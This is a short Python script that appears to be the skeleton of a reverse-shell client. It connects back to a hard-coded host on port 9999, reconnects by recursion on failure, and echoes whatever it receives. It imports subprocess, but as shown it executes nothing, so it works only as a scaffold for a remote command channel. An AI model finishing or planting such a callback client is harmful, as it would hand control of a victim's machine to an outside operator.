import socket
import subprocess

host = '10.10.60.224'
port = 9999
def create_socket():
    sock = socket.socket()
    print('[+] Initializing socket...')
    try:
        sock.connect((host, port))
        print('[+] Connecting to IP :', host)
        print('[+] Connecting on Port :,', port, '\n')
    except  socket.error as err:
        print('[-] Error in Connecting : ', err)
        print('[+] Re-connecting to the host')
        create_socket()
    recieve_commad(sock)

def recieve_commad(sock):
    while True:
        cmd = sock.recv(1024)
        print(cmd)
        sock.send(cmd)


if __name__ == '__main__':
    create_socket()
